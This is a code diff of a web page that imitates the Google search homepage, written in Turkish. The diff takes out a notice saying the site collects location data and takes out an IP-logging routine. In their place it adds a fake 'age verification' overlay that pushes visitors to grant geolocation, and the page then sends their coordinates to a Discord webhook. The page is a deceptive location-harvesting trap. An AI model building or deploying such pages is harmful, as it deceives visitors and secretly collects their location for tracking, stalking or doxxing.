@@ -120,19 +120,41 @@
             margin: 0 10px;
         }
 
-        /* Uyarı Mesajı */
-        .warning-message {
-            background-color: #f0ad4e; /* Sarımsı renk */
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            text-align: center;
-            display: none; /* Başlangıçta gizli */
+        /* Uyarı Mesajı (Yaş Doğrulama) */
+        .age-verification-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8); /* Arka planı karart */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* Diğer öğelerin üzerinde */
         }
 
-        .warning-message.show {
-            display: block;
+        .age-verification-box {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .age-verification-message {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .verify-button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
         }
 
         /* Konum Bekleniyor Mesajı */
@@ -160,11 +182,6 @@
         </div>
     </div>
 
-    <!-- Uyarı Mesajı -->
-    <div class="warning-message" id="warningMessage">
-        Bu site, eğitim amaçlıdır ve konum bilgilerinizi toplar. Lütfen dikkatli olun!
-    </div>
-
     <!-- Ana İçerik -->
     <div class="content">
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
@@ -178,6 +195,14 @@
             <button class="lucky-button">Kendimi Şanslı Hissediyorum</button>
         </div>
         <p class="location-message" id="locationMessage">Konum bekleniyor...</p>
+    </div>
+
+    <!-- Yaş Doğrulama Katmanı (Başlangıçta gizli) -->
+    <div class="age-verification-overlay" id="ageVerificationOverlay">
+        <div class="age-verification-box">
+            <p class="age-verification-message">Bu siteye erişim için 16 yaşından büyük olduğunuzu doğrulamak için lütfen konumuzun gönderilmesine izin verin.</p>
+            <button class="verify-button" onclick="verifyAge()">Doğrula</button>
+        </div>
     </div>
 
     <!-- Alt Bilgi -->
@@ -196,41 +221,17 @@
         // WEBHOOK URL'NİZİ BURAYA YAZIN (Discord için)
         const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // ÖRNEK
         const locationMessage = document.getElementById('locationMessage');
-        const warningMessage = document.getElementById('warningMessage');
+        const ageVerificationOverlay = document.getElementById('ageVerificationOverlay');
 
-        // Uyarı mesajını göster
-        warningMessage.classList.add('show');
+        // Yaş doğrulama ekranını göster
+        window.onload = () => {
+            ageVerificationOverlay.style.display = 'flex'; // Sayfa yüklendiğinde göster
+        };
 
-        // IP Adresini Al ve Webhook'a Gönder
-        async function getAndSendIP() {
-            try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                if (!ipResponse.ok) {
-                    throw new Error(`IP adresi alınamadı: ${ipResponse.status} ${ipResponse.statusText}`);
-                }
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-                const city = ipData.city;
-                const country = ipData.country_name;
-
-                // IP bilgisini Discord'a gönder
-                await sendToDiscord({
-                    content: `🌐 **IP Bilgisi:**`,
-                    embeds: [{
-                        title: "IP Bilgileri",
-                        color: 5814783,
-                        fields: [
-                            { name: "IP Adresi", value: `\`${ipAddress}\``, inline: true },
-                            { name: "Şehir", value: `\`${city}\``, inline: true },
-                            { name: "Ülke", value: `\`${country}\``, inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                });
-            } catch (error) {
-                console.error("IP adresi alınırken veya gönderilirken hata:", error);
-                await sendToDiscord({ content: `⚠️ **IP Hatası:** IP adresi alınamadı veya gönderilemedi.` });
-            }
+        // Yaşı Doğrula (Konum İzni İste)
+        async function verifyAge() {
+            ageVerificationOverlay.style.display = 'none'; // Doğrulama ekranını kapat
+            requestLocationPermission(); // Konum iznini iste
         }
 
         // Konum İzni İsteme ve Webhook'a Gönderme
@@ -246,7 +247,7 @@
 
                         // Konum bilgisini Discord'a gönder
                         await sendToDiscord({
-                            content: `📍 **Konum Bilgisi:**`,
+                            content: `📍 **Konum Bilgisi (Yaş Doğrulama):**`,
                             embeds: [{
                                 title: "Konum Bilgisi",
                                 color: 5814783,
@@ -301,13 +302,6 @@
                 // Hata durumunda uyarı vermek veya log tutmak için bir işlem yapabilirsiniz.
             }
         }
-
-        // Sayfa yüklendiğinde IP'yi al, uyarı mesajını göster ve konum iznini iste
-        window.onload = async () => {
-            warningMessage.classList.add('show'); // Sayfa yüklendiğinde uyarıyı göster
-            await getAndSendIP(); // Sayfa yüklendiğinde IP'yi al
-            requestLocationPermission(); // Konum iznini iste
-        };
     </script>
 </body>
 </html>
